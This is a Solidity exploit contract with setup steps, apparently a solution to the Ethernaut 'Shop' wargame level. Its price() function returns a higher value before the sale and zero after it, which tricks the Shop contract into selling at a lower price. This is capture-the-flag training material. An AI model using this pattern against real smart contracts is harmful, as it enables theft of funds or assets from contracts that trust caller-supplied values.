/* Tools needed for this level:
- Remix IDE

1.- Copy Ethernaut's Shop contract to Remix. No need to deploy the contract.

2.- Deploy this contract (ShopAttack) with Remix using injected web3 environment.

3.- Call the attack() function with Remix passing Ethernaut's shop contract address.
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Shop.sol';

contract ShopAttack {
	function attack(address shopAddr) public {
		Shop(shopAddr).buy();
	}

	function price() public view returns (uint256) {
		return Shop(msg.sender).isSold() ? 0 : 101;
	}
}
